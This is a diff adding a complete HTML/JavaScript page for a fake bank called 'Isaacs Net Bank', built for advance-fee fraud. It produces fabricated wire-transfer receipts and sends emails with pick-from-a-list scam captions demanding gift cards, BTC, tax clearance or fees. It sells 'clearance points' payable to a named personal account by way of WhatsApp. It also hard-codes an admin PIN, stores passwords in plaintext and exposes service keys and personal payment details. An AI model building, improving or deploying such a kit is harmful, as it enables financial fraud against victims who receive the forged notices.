@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Isaacs Net Bank | Corporate Portal</title>
+
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700;900&family=Playfair+Display:wght@700&display=swap" rel="stylesheet">
+    
+    <style>
+        :root { --gold: #d4af37; --glass: rgba(10, 15, 25, 0.85); }
+        body { font-family: 'Montserrat', sans-serif; margin: 0; background-color: #060b13; color: #ffffff; overflow-x: hidden; }
+        
+        .bg-fixed-img {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: linear-gradient(rgba(6,11,19,0.7), rgba(6,11,19,0.7)), 
+                        url('https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?q=80&w=1600');
+            background-size: cover; background-position: center; z-index: -1;
+        }
+
+        .glass-panel { 
+            background: var(--glass); 
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
+            border: 1px solid rgba(255, 255, 255, 0.1); 
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.6);
+            border-radius: 24px;
+            overflow: hidden;
+            width: 100%;
+        }
+
+        /* DYNAMIC BALANCE BOX FIX */
+        .balance-box {
+            display: flex; flex-direction: column; justify-content: center;
+            min-height: 140px; padding: 25px; text-align: left;
+            box-sizing: border-box;
+        }
+        .balance-text {
+            font-size: clamp(1.2rem, 6vw, 2.4rem);
+            font-weight: 900; line-height: 1; color: white;
+            word-break: break-all; overflow-wrap: break-word;
+            margin-top: 8px;
+        }
+
+        input, select { 
+            background: rgba(0, 0, 0, 0.6) !important; 
+            border: 1px solid rgba(212, 175, 55, 0.3) !important; 
+            color: white !important; padding: 14px !important; border-radius: 12px; 
+            width: 100%; font-size: 13px; box-sizing: border-box; outline: none;
+        }
+
+        .gold-btn { background: linear-gradient(135deg, #d4af37, #f1d592); color: #060b13; font-weight: 900; transition: 0.3s; text-transform: uppercase; border: none; cursor: pointer; }
+        .gold-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        
+        .serif { font-family: 'Playfair Display', serif; }
+        .hidden { display: none !important; }
+        
+        #receiptUI { background: #fff; color: #000; padding: 30px; width: 100%; max-width: 320px; font-family: 'Courier New', monospace; position: relative; }
+        .bank-stamp { width: 70px; position: absolute; bottom: 10px; right: 10px; opacity: 0.6; transform: rotate(-15deg); }
+    </style>
+</head>
+<body>
+
+    <div class="bg-fixed-img"></div>
+
+    <div id="loader" class="fixed inset-0 bg-[#060b13] z-[9999] hidden flex-col items-center justify-center">
+        <div class="w-12 h-12 border-4 border-gold border-t-transparent rounded-full animate-spin"></div>
+        <p id="loadText" class="mt-4 text-gold text-[10px] font-bold tracking-widest uppercase">System Authorizing...</p>
+    </div>
+
+    <div id="authPage" class="min-h-screen flex items-center justify-center p-6">
+        <div class="max-w-md w-full glass-panel p-10 text-center">
+            <img src="https://i.ibb.co/Y7VRb0xL/IMG-5536.jpg" class="w-24 h-24 mx-auto rounded-full border-2 border-gold mb-6">
+            <h1 class="serif text-4xl text-white mb-2">Isaacs Net Bank</h1>
+            <p class="text-[11px] text-gray-400 mb-8 uppercase tracking-widest">Global Wealth Management <span id="secretTrigger" onclick="triggerAdmin()" class="cursor-pointer text-gold">2000</span></p>
+            
+            <div class="flex gap-4 mb-8">
+                <button onclick="toggleTab('login')" id="lTab" class="flex-1 py-2 text-xs font-black border-b-2 border-gold">LOGIN</button>
+                <button onclick="toggleTab('signup')" id="sTab" class="flex-1 py-2 text-xs font-black opacity-30">SIGN UP</button>
+            </div>
+
+            <div id="loginForm" class="space-y-4">
+                <input type="email" id="lEmail" placeholder="Vault Email">
+                <input type="password" id="lPass" placeholder="Access Key">
+                <button onclick="handleLogin()" class="w-full gold-btn py-5 rounded-xl">Unlock Vault</button>
+            </div>
+
+            <div id="signupForm" class="hidden space-y-4">
+                <input type="text" id="sName" placeholder="Full Legal Name">
+                <input type="email" id="sEmail" placeholder="Email Address">
+                <input type="password" id="sPass" placeholder="Create Access Key">
+                <button onclick="handleSignup()" class="w-full gold-btn py-5 rounded-xl">Create Account</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="dashboardPage" class="hidden min-h-screen p-6 max-w-5xl mx-auto">
+        <div class="flex justify-between items-center py-6">
+            <h2 class="serif text-gold text-2xl">Isaacs Net Bank</h2>
+            <button onclick="location.reload()" class="bg-red-500/20 text-red-400 px-4 py-1 rounded text-[10px] font-bold uppercase">Logout</button>
+        </div>
+        
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-6 my-10">
+            <div class="glass-panel balance-box">
+                <p class="text-[10px] text-gold font-bold uppercase tracking-widest">Available Balance</p>
+                <h1 id="dispBal" class="balance-text">$0.00</h1>
+            </div>
+            <div class="glass-panel balance-box border-l-4 border-emerald-500">
+                <p class="text-[10px] text-emerald-400 font-bold uppercase tracking-widest">Clearance Points</p>
+                <h1 id="dispPts" class="balance-text text-emerald-500">0</h1>
+            </div>
+        </div>
+
+        <div class="grid grid-cols-2 gap-4 mb-10">
+            <button onclick="showPage('transfer')" class="glass-panel p-10 hover:bg-white/5 flex flex-col items-center">💸<span class="mt-4 text-[11px] font-bold tracking-widest uppercase">Wire Transfer</span></button>
+            <button onclick="showPage('pointsSelect')" class="glass-panel p-10 hover:bg-white/5 flex flex-col items-center">💎<span class="mt-4 text-[11px] font-bold tracking-widest uppercase">Get Points</span></button>
+        </div>
+
+        <div class="glass-panel p-8">
+            <h3 class="text-center text-[10px] font-bold text-gray-500 mb-8 uppercase tracking-[0.3em]">Encrypted Audit Log</h3>
+            <div id="historyList" class="space-y-4"></div>
+        </div>
+    </div>
+
+    <div id="transferPage" class="hidden min-h-screen p-4 flex items-center justify-center">
+        <div class="max-w-md w-full glass-panel p-10">
+            <h2 class="serif text-center text-2xl text-gold mb-4 uppercase">Global Wire</h2>
+            
+            <div id="pointGate" class="bg-gold/10 border border-gold/30 p-4 rounded-xl mb-6">
+                <p class="text-[9px] text-gold font-black uppercase tracking-widest mb-1">Security Notice:</p>
+                <p class="text-[11px] text-gray-200">Global transfers require <span class="text-gold font-bold">300 Clearance Points</span> per authorization. Please ensure points are active.</p>
+            </div>
+
+            <div class="space-y-4">
+                <input type="text" id="tName" placeholder="Beneficiary Full Name">
+                <input type="text" id="tBank" placeholder="Beneficiary Bank Name">
+                <input type="text" id="tAcc" placeholder="Account Number">
+                
+                <div class="flex gap-2">
+                    <select id="tCurr" class="w-1/2">
+                        <option value="$">USD ($)</option>
+                        <option value="₦">NGN (₦)</option>
+                        <option value="€">EUR (€)</option>
+                        <option value="£">GBP (£)</option>
+                        <option value="₵">GHS (₵)</option>
+                        <option value="R">ZAR (R)</option>
+                        <option value="KSh">KES (KSh)</option>
+                        <option value="C$">CAD (C$)</option>
+                        <option value="A$">AUD (A$)</option>
+                        <option value="د.إ">AED (د.إ)</option>
+                    </select>
+                    <input type="number" id="tAmt" placeholder="Amount" class="w-1/2">
+                </div>
+
+                <select id="tStatus">
+                    <option value="Successfully">Successfully</option>
+                    <option value="Pending">Pending</option>
+                    <option value="Failed">Failed</option>
+                </select>
+
+                <select id="tCapt">
+                    <option value="Transfer Authorized. Funds Dispatched Successfully.">Dispatch Confirmed</option>
+                    <option value="Transaction Blocked: Verification Gift Card Required.">Gift Card Required</option>
+                    <option value="Global Node Error: BTC Clearance Injection Required.">BTC Required</option>
+                    <option value="Security Hold: 5% Transaction Fee Required for Release.">Transaction Fees Needed</option>
+                    <option value="IRS Clearance Required for High Volume Transfer.">Tax Clearance Required</option>
+                </select>
+
+                <input type="email" id="tEmail" placeholder="Notification Email (Recipient)">
+                <button id="execBtn" onclick="doTransfer()" class="w-full gold-btn py-5 rounded-xl text-xs">Execute Global Wire</button>
+                <button onclick="showPage('dashboard')" class="w-full py-4 text-[10px] opacity-30 uppercase">Go Back</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="pointsSelectPage" class="hidden min-h-screen p-4 flex items-center justify-center">
+        <div class="max-w-md w-full glass-panel p-8 text-center">
+            <h2 class="serif text-2xl text-gold mb-2 uppercase">Clearance Packs</h2>
+            <p class="text-[10px] text-gray-400 mb-8 uppercase tracking-widest italic">Authorization Node Injection</p>
+            
+            <div class="space-y-4">
+                <div onclick="prepPayment('30 Points', '₦10,000')" class="p-5 glass-panel hover:bg-gold/10 cursor-pointer flex justify-between items-center transition-all">
+                    <div class="text-left"><span class="block text-white font-bold text-sm">30 Points Pack</span><span class="text-[10px] text-gray-400">STARTER</span></div>
+                    <b class="text-gold">₦10,000</b>
+                </div>
+
+                <div onclick="prepPayment('100 Points', '₦50,000')" class="p-5 glass-panel hover:bg-gold/10 cursor-pointer flex justify-between items-center transition-all">
+                    <div class="text-left"><span class="block text-white font-bold text-sm">100 Points Pack</span><span class="text-[10px] text-gray-400">PRO NODE</span></div>
+                    <b class="text-gold">₦50,000</b>
+                </div>
+
+                <div onclick="prepPayment('Unlimited Points', '₦100,000')" class="p-5 glass-panel border-gold/40 bg-gold/5 hover:bg-gold/10 cursor-pointer flex justify-between items-center transition-all">
+                    <div class="text-left text-gold"><span class="block font-black text-sm uppercase">Elite Unlimited</span><span class="text-[10px]">LIFETIME</span></div>
+                    <b class="bg-gold text-black px-2 py-1 rounded text-xs font-black">₦100,000</b>
+                </div>
+
+                <button onclick="showPage('dashboard')" class="mt-8 text-[10px] opacity-40 uppercase tracking-widest">Cancel</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="gatewayPage" class="hidden min-h-screen p-4 flex items-center justify-center">
+        <div class="max-w-sm w-full glass-panel p-10 text-center">
+            <p class="text-[10px] text-gray-500 uppercase font-bold mb-4">Direct Payment Node</p>
+            <h3 id="payTitle" class="text-gold font-bold mb-6 text-sm"></h3>
+            <div class="bg-black/50 p-6 rounded-2xl mb-8 border border-white/10">
+                <p class="text-[10px] opacity-40 uppercase mb-2">Account Name</p>
+                <p class="text-sm font-bold mb-4 uppercase">MODESTUS OBINGA</p>
+                <p class="text-[10px] opacity-40 uppercase mb-2">Account Number</p>
+                <p class="text-3xl font-black text-gold tracking-tighter">8024383636</p>
+                <p class="text-[10px] mt-4 text-emerald-500 font-bold uppercase">OPAY / DIGITAL BANK</p>
+            </div>
+            <button onclick="confirmPay()" class="w-full gold-btn py-5 rounded-xl mb-4 text-xs">I Have Made Payment</button>
+            <button onclick="showPage('pointsSelect')" class="w-full py-4 text-[10px] opacity-40 uppercase">Back</button>
+        </div>
+    </div>
+
+    <div id="finalModal" class="hidden fixed inset-0 bg-black/98 z-[1000] flex items-center justify-center p-6">
+        <div class="max-w-sm w-full">
+            <div id="alertBox" class="glass-panel p-10 mb-6 text-center">
+                <h3 class="serif text-2xl text-gold mb-4 uppercase">System Alert</h3>
+                <p id="alertMsg" class="text-xs text-white mb-8 font-bold leading-relaxed uppercase border-t border-white/10 pt-4"></p>
+                <button onclick="showReceipt()" class="w-full gold-btn py-4 rounded-xl">View Audit Receipt</button>
+            </div>
+            <div id="receiptContainer" class="hidden flex flex-col items-center w-full">
+                <div id="receiptUI">
+                    <img src="https://i.ibb.co/L6S9s4L/bank-stamp-red.png" class="bank-stamp">
+                    <h2 class="text-center font-black text-xl mb-6">ISAACS NET BANK</h2>
+                    <div class="space-y-4 text-[11px] border-t pt-4">
+                        <p><strong>REFERENCE:</strong> <span id="rRef"></span></p>
+                        <p><strong>BENEFICIARY:</strong> <span id="rName"></span></p>
+                        <p><strong>AMOUNT:</strong> <span id="rAmt"></span></p>
+                        <p><strong>STATUS:</strong> <span id="rStatus" class="font-bold"></span></p>
+                    </div>
+                </div>
+                <button onclick="downloadReceipt()" class="mt-6 w-full gold-btn py-5 rounded-xl">Download Receipt</button>
+                <button onclick="location.reload()" class="mt-4 text-[10px] font-bold text-gold uppercase">Exit Portal</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="adminPanel" class="hidden fixed inset-0 bg-black z-[10000] p-6 overflow-y-auto">
+        <div class="max-w-5xl mx-auto">
+            <h1 class="text-red-500 font-black text-2xl mb-8 uppercase tracking-tighter">System Override Core</h1>
+            <div id="pinLock"><input type="password" id="rootPin" placeholder="MASTER PIN" class="mb-4 text-center block mx-auto"><button onclick="unlockAdmin()" class="w-full max-w-xs block mx-auto bg-red-600 py-4 rounded font-bold">ACCESS CORE</button></div>
+            <div id="adminControls" class="hidden space-y-10">
+                <div class="glass-panel p-8 border-red-500/20"><div class="grid grid-cols-1 md:grid-cols-4 gap-4"><input type="email" id="admEmail" placeholder="User Email"><input type="number" id="admPts" placeholder="Points"><input type="number" id="admBal" placeholder="Balance $"><button onclick="injectData()" class="bg-emerald-600 py-3 rounded font-bold text-xs">INJECT DATA</button></div></div>
+                <div id="adminUserTable" class="glass-panel p-8 text-[11px] overflow-x-auto"></div>
+            </div>
+            <button onclick="document.getElementById('adminPanel').classList.add('hidden')" class="mt-10 block mx-auto text-xs opacity-40">EXIT OVERRIDE</button>
+        </div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getDatabase, ref, set, get, update, onValue } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyBQqNHNg2z8c-s9whF456fHQymT8dGeXnY",
+            authDomain: "isaacsnetbnk.firebaseapp.com",
+            databaseURL: "https://isaacsnetbnk-default-rtdb.firebaseio.com",
+            projectId: "isaacsnetbnk",
+            storageBucket: "isaacsnetbnk.firebasestorage.app",
+            messagingSenderId: "53055208512",
+            appId: "1:53055208512:android:ebaaa96140bcec390973a5"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+        emailjs.init("PHxbwgT7e38foJP6S");
+
+        window.toggleTab = (t) => {
+            document.getElementById('loginForm').classList.toggle('hidden', t === 'signup');
+            document.getElementById('signupForm').classList.toggle('hidden', t === 'login');
+            document.getElementById('lTab').classList.toggle('opacity-30', t !== 'login');
+            document.getElementById('sTab').classList.toggle('opacity-30', t !== 'signup');
+        };
+
+        window.showPage = (p) => {
+            ['authPage','dashboardPage','transferPage','pointsSelectPage','gatewayPage'].forEach(id => {
+                const el = document.getElementById(id); if(el) el.classList.add('hidden');
+            });
+            document.getElementById(p + 'Page').classList.remove('hidden');
+        };
+
+        window.prepPayment = (pack, price) => {
+            window.selectedPack = pack;
+            document.getElementById('payTitle').innerText = `INJECTING ${pack.toUpperCase()} FOR ${price}`;
+            showPage('gateway');
+        };
+
+        window.confirmPay = () => {
+            window.location.href = `https://wa.me/2348024383636?text=I%20have%20made%20payment%20for%20the%20${encodeURIComponent(window.selectedPack)}`;
+        };
+
+        window.updateUI = () => {
+            const u = window.currentUser; if(!u) return;
+            document.getElementById('dispBal').innerText = `$${u.balance.toLocaleString()}.00`;
+            
+            // UNLIMITED LOGIC DISPLAY
+            if(u.points >= 99999) {
+                document.getElementById('dispPts').innerText = "∞";
+                document.getElementById('execBtn').disabled = false;
+                document.getElementById('pointGate').classList.add('hidden');
+            } else {
+                document.getElementById('dispPts').innerText = u.points.toLocaleString();
+                document.getElementById('execBtn').disabled = u.points < 300;
+                document.getElementById('pointGate').classList.toggle('hidden', u.points >= 300);
+            }
+
+            document.getElementById('historyList').innerHTML = (u.history || []).map(t => `
+                <div class="glass-panel p-5 flex justify-between items-center">
+                    <div class="text-[10px]"><b class="text-white text-xs uppercase">${t.recipient_name}</b><br><span class="opacity-40">${t.date}</span></div>
+                    <div class="text-right text-[10px]"><b>${t.currency}${t.amount}</b><br><span style="color:${t.status === 'Successfully' ? '#10b981' : (t.status === 'Pending' ? '#f59e0b' : '#ef4444')}" class="font-bold uppercase">${t.status}</span></div>
+                </div>`).reverse().join('');
+        };
+
+        window.handleLogin = async function() {
+            const e = document.getElementById('lEmail').value, ck = e.replace(/\./g, '_');
+            const sn = await get(ref(db, 'users/' + ck));
+            if (sn.exists() && sn.val().pass === document.getElementById('lPass').value) {
+                onValue(ref(db, 'users/' + ck), (s) => { window.currentUser = s.val(); updateUI(); });
+                showLoader("Decrypting Account...", () => showPage('dashboard'), 2000);
+            } else alert("Invalid Credentials");
+        };
+
+        window.handleSignup = async function() {
+            const e = document.getElementById('sEmail').value;
+            if(!e) return alert("Email Required");
+            await set(ref(db, 'users/' + e.replace(/\./g, '_')), { name: document.getElementById('sName').value, email: e, pass: document.getElementById('sPass').value, balance: 500000, points: 0, history: [] });
+            alert("Account Protocol Established"); toggleTab('login');
+        };
+
+        window.doTransfer = async function() {
+            const u = window.currentUser;
+            const caption = document.getElementById('tCapt').value;
+            const data = { 
+                recipient_name: document.getElementById('tName').value, 
+                amount: document.getElementById('tAmt').value, 
+                currency: document.getElementById('tCurr').value, 
+                status: document.getElementById('tStatus').value, 
+                caption: caption, // CAPTION ALERT COLLECTED HERE
+                recipient_email: document.getElementById('tEmail').value,
+                date: new Date().toLocaleString(), 
+                ref: "INB"+Math.floor(Math.random()*999999) 
+            };
+
+            showLoader("Establishing SSL Node...", async () => {
+                const h = u.history || []; h.push(data);
+                const newPts = (u.points >= 99999) ? u.points : (u.points - 300);
+                
+                // UPDATE FIREBASE
+                await update(ref(db, 'users/' + u.email.replace(/\./g, '_')), { 
+                    balance: u.balance - parseFloat(data.amount), 
+                    points: newPts, 
+                    history: h 
+                });
+
+                // EMAILJS CONNECTION WITH CAPTION ALERT
+                emailjs.send("service_rktag9m", "template_x4qbhzk", { 
+                    to_email: data.recipient_email, 
+                    to_name: data.recipient_name, 
+                    amount: data.currency + data.amount, 
+                    reference: data.ref, 
+                    status: data.status,
+                    caption: data.caption, // CAPTION ALERT SENT TO EMAIL
+                    bank_name: document.getElementById('tBank').value,
+                    account_number: document.getElementById('tAcc').value
+                }).catch(e => console.error(e));
+
+                // UI UPDATE
+                document.getElementById('alertMsg').innerText = data.caption;
+                document.getElementById('rRef').innerText = data.ref; 
+                document.getElementById('rName').innerText = data.recipient_name; 
+                document.getElementById('rAmt').innerText = data.currency + data.amount; 
+                document.getElementById('rStatus').innerText = data.status;
+                document.getElementById('rStatus').style.color = (data.status === 'Successfully' ? '#10b981' : (data.status === 'Pending' ? '#f59e0b' : '#ef4444'));
+                document.getElementById('finalModal').classList.remove('hidden');
+            }, 3000);
+        };
+
+        // ADMIN OVERRIDE LOGIC
+        window.unlockAdmin = () => { if(document.getElementById('rootPin').value === "0803") { document.getElementById('pinLock').classList.add('hidden'); document.getElementById('adminControls').classList.remove('hidden'); loadUsers(); } };
+        window.loadUsers = () => { onValue(ref(db, 'users'), (snap) => { let h = '<table class="w-full text-left"><tr><th>Name</th><th>Email</th><th>Balance</th><th>Points</th></tr>'; const u = snap.val(); for(let k in u) h += `<tr class="border-b border-white/5"><td class="py-2">${u[k].name}</td><td>${u[k].email}</td><td>$${u[k].balance}</td><td>${u[k].points}</td></tr>`; document.getElementById('adminUserTable').innerHTML = h + '</table>'; }); };
+        window.injectData = async function() {
+            const e = document.getElementById('admEmail').value.replace(/\./g, '_');
+            const snap = await get(ref(db, 'users/' + e)); if(!snap.exists()) return alert("User Not Found");
+            const up = {}; if(document.getElementById('admPts').value) up.points = parseInt(document.getElementById('admPts').value); if(document.getElementById('admBal').value) up.balance = parseFloat(document.getElementById('admBal').value);
+            await update(ref(db, 'users/' + e), up); alert("Injection Complete");
+        };
+
+        window.showLoader = (txt, cb, dur) => { const l = document.getElementById('loader'); l.style.display = 'flex'; document.getElementById('loadText').innerText = txt; setTimeout(() => { l.style.display = 'none'; cb(); }, dur); };
+        let clickCount = 0; window.triggerAdmin = () => { clickCount++; if(clickCount>=3) document.getElementById('adminPanel').classList.remove('hidden'); setTimeout(()=>clickCount=0,2000); };
+        window.showReceipt = () => { document.getElementById('alertBox').classList.add('hidden'); document.getElementById('receiptContainer').classList.remove('hidden'); };
+        window.downloadReceipt = () => { html2canvas(document.querySelector("#receiptUI")).then(c => { const a = document.createElement('a'); a.download = 'Audit_Receipt.png'; a.href = c.toDataURL(); a.click(); }); };
+    </script>
+</body>
+</html>
